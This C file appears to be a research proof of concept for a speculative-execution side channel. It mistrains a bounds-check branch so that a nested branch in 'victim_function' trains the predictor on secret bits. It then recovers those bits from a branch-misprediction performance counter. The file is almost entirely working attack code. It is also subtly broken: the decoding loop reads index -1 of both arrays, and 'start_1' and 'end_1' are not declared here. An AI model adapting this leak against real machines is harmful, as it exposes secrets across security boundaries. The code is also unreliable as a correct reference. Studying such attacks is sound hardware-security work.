#include "../../include/util.h"
#include "../../include/timingtest.h"

// Using BR_MISP_EXEC.ALL_CONDITIONAL PCM

unsigned int array_size = 0;
const int pmc1 = 0x00000000; // BR_MISP_EXEC.ALL_CONDITIONAL
uint64_t pmc1_start, pmc1_end;
int data[500] = {0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1}; // Each 5th bit of this array is a secret. The rest of the bits are used for initialization
uint64_t pmc_probe[1][500] = {};

void victim_function(uint8_t x, int y) {
  // Parent branch (x < array_size), to be exploited by attacker to trigger misspeculation, bp
  if (x > array_size) {
    // Conditional nested branch to be exploited in speculative execution, bv
    if (y) {
      asm("nop");
    }
  }
};

void main () {
  int limit = 500;

  for (int i = 0; i < limit; i++) {
    AT_START; // Macro to execute 12 taken branch (with same source and destination to flush GHR)

    flush(&array_size); // Flush "array_size" to speculate bp
    mfence();

    start_1 = (int)readpmc(pmc1); // Monitor the BR_MISP_EXEC.ALL_CONDITIONAL PMC
    victim_function(((i-4)%5), data[i]); // At every fifth iteration of this loop, (i-4)%5 will be eqault to 0. In that case, bv should not execute. But due to misprediction of bp (trained using prev four execution of this loop), bv will execute and train the PHT speculatively using the corresponding bit of data 
    end_1 = (int)readpmc(pmc1);

    pmc_probe[0][i] = end_1-start_1;
  }
  mfence();

  int error = 0;
  int val = 0;
  for (int i = 0; i < (limit/5); i++) {
    // Every fifth loop iteration contains a secret, hence only check the performance counter statistics for this
    val = 0;
    /*
     * Note that on every fifth run of the attack loop will misspeculate bp in the direction bv (while the correct path is not executing bv), hence the BR_MISP_EXEC.ALL_CONDITIONAL counter will always show atleast 1 mispredictions for bp. Since we have intialized bv using [0], it will have no further mispredictions if secret = [0], and it will have 1 additional misprediction if secret = [1]
     *
     * If secret = 0 -> total mispredictions = 1 [1 for bp, 0 for bv] 
     * If secret = 1 -> total mispredictions = 2 [1 for bp, 1 for bv] 
     */
    if (pmc_probe[0][(i*5)-1] > 1) val = 1;

    if ((data[(i*5)-1]) != val) {
        error++;
    }
  }
  printf("ERROR: %d\n",error);
}
